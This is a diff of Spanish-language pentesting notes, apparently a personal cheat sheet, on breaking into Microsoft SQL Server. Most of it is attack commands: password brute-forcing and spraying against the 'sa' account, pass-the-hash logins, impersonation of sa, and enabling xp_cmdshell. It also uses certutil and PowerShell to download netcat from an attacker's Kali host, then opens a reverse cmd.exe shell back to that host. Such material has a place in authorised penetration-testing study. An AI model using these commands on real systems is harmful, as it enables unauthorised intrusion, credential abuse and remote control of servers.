@@ -36,24 +36,7 @@ Tags: #MSSQL #SQLServer #Windows #DC #RCE #HashCapture #NTLMRelay #Impersonacion
 
 # DESDE FUERA DEL SERVIDOR (ACCESO REMOTO)
 
-## 1. VERIFICAR SI MSSQL ESTÁ EXPUESTO Y ENUMERAR
-
-```bash
-❯ nmap -p 1433 --open ❮IP❯
-# Confirmar que el puerto está abierto y escuchando
-
-❯ nmap ❮IP❯ -p 1433 --script ms-sql-info
-# Versión del servidor, nombre de instancia, hostname
-
-❯ nmap ❮IP❯ -p 1433 --script ms-sql-empty-password
-# Detectar usuarios sin contraseña → incluye sa y otros
-
-❯ nmap ❮IP❯ -p 1433 --script ms-sql-ntlm-info \
-  --script-args mssql.instance-port=1433
-# Información adicional vía NTLM → dominio, hostname, FQDN
-```
-
-## 2. PROBAR ACCESO CON USUARIO SA (POR DEFECTO)
+## 1. PROBAR ACCESO CON USUARIO SA (POR DEFECTO) Y VALIDACIÓN CON CREDENCIALES CONOCIDAS (DESDE AFUERA)
 
 ```bash
 # sa → System Administrator → usuario por defecto de MSSQL
@@ -69,15 +52,13 @@ Tags: #MSSQL #SQLServer #Windows #DC #RCE #HashCapture #NTLMRelay #Impersonacion
 ❯ nxc mssql ❮IP❯ -u 'sa' -p 'password' 
 # Contraseñas comunes para sa → probar siempre antes de fuerza bruta
 
-❯ nxc mssql ❮IP❯ -u 'sa' -p /usr/share/seclists/Passwords/Common-Credentials/best110.txt --local-auth
-# Fuerza bruta al sa con wordlist corta → más rápido
 
-# [Pwn3d!] → sa está habilitado y eres sysadmin → xp_cmdshell disponible
+IMPORTANTE 
+	- [Pwn3d!] → sa está habilitado y eres sysadmin → xp_cmdshell disponible
 ```
 
-## 3. VALIDACIÓN DE ACCESO CON CREDENCIALES CONOCIDAS
-
 ```bash
+❯ nxc mssql ❮IP❯ -u 'user' -p 'pass' 
 ❯ nxc mssql ❮IP❯ -u 'user' -p 'pass' --local-auth
 # Autenticación SQL local → no requiere dominio
 
@@ -87,43 +68,77 @@ Tags: #MSSQL #SQLServer #Windows #DC #RCE #HashCapture #NTLMRelay #Impersonacion
 ❯ nxc mssql ❮IP❯ -u 'user' -H 'NThash' -d domain.corp
 # Pass-the-Hash → sin contraseña en claro
 
-❯ nxc mssql ❮IP❯ -u users.txt -p passwords.txt --continue-on-success
-# Spraying de credenciales
 
-# Insight:
-# [Pwn3d!] → sysadmin → xp_cmdshell directo
-# Sin [Pwn3d!] pero con acceso → enumerar y buscar impersonación
+IMPORTANTE:
+	- [Pwn3d!] → sysadmin → xp_cmdshell directo
+	- Sin [Pwn3d!] pero con acceso → enumerar y buscar impersonación
 ```
 
-## 4. CONEXIÓN Y AUTENTICACIÓN
+### 1a. Fuerza bruta 
+```bash 
+❯ nxc mssql ❮IP❯ -u 'sa' -p /usr/share/seclists/Passwords/Common-Credentials/best110.txt 
+❯ nxc mssql ❮IP❯ -u 'sa' -p /usr/share/seclists/Passwords/Common-Credentials/best110.txt --local-auth
+# Fuerza bruta al sa con wordlist corta → más rápido
+
+❯ nxc mssql ❮IP❯ -u users.txt -p passwords.txt --continue-on-success
+# Spraying de credenciales
+```
+
+### 1b. Si se trae el puerto por medio de un Pivot (Chisel) - VALIDACIÓN
+```bash 
+❯ nxc mssql 127.0.0.1 -u 'user' -p 'pass' 
+❯ nxc mssql 127.0.0.1 -u 'user' -p 'pass' --local-auth
+```
+
+## 2. CONEXIÓN Y AUTENTICACIÓN
 
 ```bash
+# Si el puerto esta expuesto en el server  
 # Autenticación Windows (dominio) → más común en AD
-❯ impacket-mssqlclient domain01.corp/'user:passwd'@❮IP❯ -windows-auth
+❯ impacket-mssqlclient domain01.corp/'user:passwd'@❮IP❯ -windows-auth     <- IMPORTANTE 
 
 # Puerto no estándar
 ❯ impacket-mssqlclient domain.corp/'user:passwd'@❮IP❯ -windows-auth -port 1433
 ```
 
 ```bash 
-# Autenticación SQL local → sa u otros usuarios SQL
+# Autenticación SQL local con el usuario → sa 
 ❯ impacket-mssqlclient 'sa:passwd'@❮IP❯
 
 # sqsh → alternativa cuando impacket falla
 ❯ sqsh -S ❮IP❯ -U 'user' -P 'passwd'
-# Los comandos en sqsh terminan con 'go' para ejecutarse
+	# Los comandos en sqsh terminan con 'go' para ejecutarse
 
-# Insight:
-# [Pwn3d!] → sysadmin → xp_cmdshell directo
-# Sin [Pwn3d!] pero con acceso → enumerar y buscar impersonación
+
+IMPORTANTE:
+	- [Pwn3d!] → sysadmin → xp_cmdshell directo
+	- Sin [Pwn3d!] pero con acceso → enumerar y buscar impersonación
 ```
 
-### 4a. OBTENER REVERSE SHELL (DESDE FUERA)
+### 2a. Si se trae el puerto por medio de un Pivot (Chisel) - AUTENTICACIÓN 
+
+```bash 
+❯ impacket-mssqlclient 'user:passwd'@127.0.0.1 -windows-auth      <- IMPORTANTE
+
+❯ impacket-mssqlclient domain01.corp/'user:passwd'@127.0.0.1 -windows-auth      <- IMPORTANTE 
+❯ impacket-mssqlclient domain01.corp/'user:passwd'@localhost -windows-auth 
+```
+
+
+### 2b. OBTENER REVERSE SHELL (DESDE AFUERA)
+
+```bash 
+Paso 0: (OPCIONAL)
+# Un login que no pertenece al rol sysadmin puede cambiar el contexto a sa si tiene el permiso efectivo IMPERSONATE sobre ese login, o un privilegio más amplio que incluya esa capacidad. No todos los usuarios pueden hacerlo
+
+❯ exec_as_login sa    # Si se tiene el permiso cambiara al user SA → SYSADMIN
+```
 
 ```bash
-# Insight:
-# [Pwn3d!] → sysadmin → xp_cmdshell directo
-# Requiere xp_cmdshell habilitado → ser sysadmin o impersonar SA
+IMPORTANTE
+	- [Pwn3d!] → sysadmin → xp_cmdshell directo
+	- Requiere xp_cmdshell habilitado → ser sysadmin o impersonar SA
+
 
 Paso 1:
 ❯ SELECT IS_SRVROLEMEMBER('sysadmin')
@@ -142,7 +157,11 @@ Paso 2:
 Paso 3:
 # comprobar si quedo habilitado 
 ❯ EXEC sp_configure 'xp_cmdshell';
+
 # Se debería ver config_value y run_value en 1
+name          minimum   maximum   config_value   run_value   
+-----------   -------   -------   ------------   ---------   
+xp_cmdshell         0         1              1           1  
 
 Paso 4:
 # Ejecutar comandos
@@ -156,18 +175,21 @@ Paso 1:
 # Crear directorio temporal si no existe
 ❯ xp_cmdshell "mkdir C:\Temp"
 
-# Paso 2 → Descargar nc.exe desde Kali
-❯ EXEC xp_cmdshell 'certutil -urlcache -split -f http://❮IP_KALI❯/nc.exe C:\temp\nc.exe'
-# Antes: python3 -m http.server 80 en Kali
+
+# Paso 2 → Descargar nc64.exe desde Kali
+❯ EXEC xp_cmdshell 'certutil -urlcache -split -f http://❮IP_KALI❯/nc64.exe C:\temp\nc64.exe'
+# Antes: 
+	python3 -m http.server 80   # Compartir el Netcat desde Kali 
 
 # Alternativa a certutil
-❯ xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadFile(\"http://❮IP_KALI❯/nc.exe\",\"C:\temp\nc.exe\")"'
+❯ xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadFile(\"http://❮IP_KALI❯/nc64.exe\",\"C:\temp\nc64.exe\")"'
+
 
 # Paso 3 → Ejecutar reverse shell
-❯ EXEC xp_cmdshell 'C:\temp\nc.exe -e cmd.exe ❮IP_KALI❯ 443'
-# Antes: rlwrap nc -nlvp 443 en Kali
-
-# En sqsh → añadir 'go' después de cada comando
+❯ EXEC xp_cmdshell 'C:\temp\nc64.exe -e cmd.exe ❮IP_KALI❯ 443'
+# Antes: 
+	penelope -p 443       # Recibir la revershell en Kali  
+	rlwrap nc -nlvp 443   # Recibir la revershell en Kali
 ```
 
 ## 5. ENUMERACIÓN DENTRO DEL MSSQL (DESDE FUERA)
